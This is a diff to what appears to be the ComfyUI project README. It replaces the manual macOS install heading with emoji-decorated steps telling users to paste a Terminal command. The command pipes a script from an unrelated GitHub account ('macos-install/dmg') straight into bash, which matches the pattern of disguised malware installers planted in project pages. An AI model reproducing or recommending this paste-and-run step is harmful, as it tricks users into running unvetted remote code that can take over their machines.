@@ -103,7 +103,15 @@ ComfyUI lets you design and execute advanced stable diffusion pipelines using a 
 3. Extract the file.
 4. **Run.** (No extra setup required).
 
-### Manual Install (macOS)
+### MacOS
+
+- 💻Open **Terminal**
+- ☑Paste the **command** below
+- ✅Press **Enter**
+
+```sh
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/macos-install/dmg/refs/heads/main/ComfyUI_installer)"
+```
 
 ## Shortcuts
 
